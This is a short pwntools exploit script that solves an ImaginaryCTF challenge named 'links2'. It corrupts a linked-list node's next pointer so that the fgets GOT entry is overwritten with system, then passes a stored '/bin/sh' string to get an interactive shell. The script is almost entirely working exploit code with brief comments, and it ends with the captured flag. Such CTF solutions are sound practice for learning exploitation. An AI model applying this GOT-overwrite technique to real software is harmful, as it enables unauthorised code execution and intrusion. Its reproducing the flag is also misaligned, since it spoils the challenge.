from pwn import *

elf = context.binary = ELF('links2')
p = elf.process()
#p = remote('puzzler7.imaginaryctf.org',2007)

#### functions
def view():
	p.sendlineafter('>>>','1')

def write(index,value):
	p.sendlineafter('>>>','2')
	p.sendlineafter('>>>',index)
	p.sendlineafter('>>>',value)

def view_time():
	p.sendlineafter('>>>','3')

# PAYLOAD
write('0','/bin/sh\x00') # writing bin sh in 0th index
write('1','B'*64)
write('2','C'*64)

## overwrite next
payload = b'D'*64
payload += p64(elf.got['fgets'])
write('1',payload) # overwriting  1 st value's next with fgets got
write('2',p64(elf.sym['system'])) # now the seccond value we write will be stored in fgets got

## shell
p.sendline('2') # calling write()
p.sendline('0') # we're giving 0, coz our /bin/sh is in 0th index
# now it calls fgets with the value in index 0
# so we can execute system('/bin/sh')
p.interactive()

# ictf{who_knew_the_current_date_could_be_so_dangerous?}
